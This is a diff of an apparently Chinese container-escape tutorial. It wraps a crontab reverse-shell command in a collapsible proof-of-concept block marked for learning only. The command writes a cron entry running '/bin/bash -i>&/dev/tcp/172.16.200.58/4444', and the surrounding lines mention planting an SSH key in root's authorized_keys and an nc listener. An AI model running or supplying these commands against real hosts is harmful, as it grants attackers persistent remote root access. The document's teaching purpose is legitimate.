@@ -249,9 +249,12 @@ root@nginx-deployment:/# echo "<YOUR_ID_RSA.PUB>" > /mnt/root/.ssh/authorized_ke
 
 写入 crontab 来反弹获取 shell，执行如下命令，将反弹 shell 的命令写入 /var/spool/cron/root 文件中：
 
-```
-echo "*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/172.16.200.58/4444 0>&1" > root
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">echo "*/1  *  *  *  *   /bin/&#98;ash -i&gt;&amp;&#47;dev/tcp/172.16.200.58/4444 0&gt;&amp;1" &gt; root</code></pre>
+
+</details>
 
 nc 监听接收反弹 shell：
 
